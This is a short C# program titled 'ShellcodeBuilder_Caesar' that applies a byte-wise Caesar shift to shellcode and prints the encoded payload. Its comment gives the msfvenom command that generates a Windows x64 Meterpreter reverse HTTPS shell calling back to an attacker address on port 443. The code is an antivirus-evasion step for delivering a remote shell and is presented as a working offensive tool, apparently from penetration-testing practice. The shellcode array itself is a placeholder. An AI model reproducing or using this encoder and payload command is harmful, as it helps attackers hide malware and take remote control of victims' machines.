using System;
using System.Text;

namespace ShellcodeBuilder_Caesar
{
    class Caesar_Builder
    {
        static void Main(string[] args)
        {
            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.128 LPORT=443 -f csharp
            // HERE

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 983) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("[+] Length of new payload: " + buf.Length);
            Console.WriteLine("[+] Payload: " + hex.ToString());
        }
    }
}
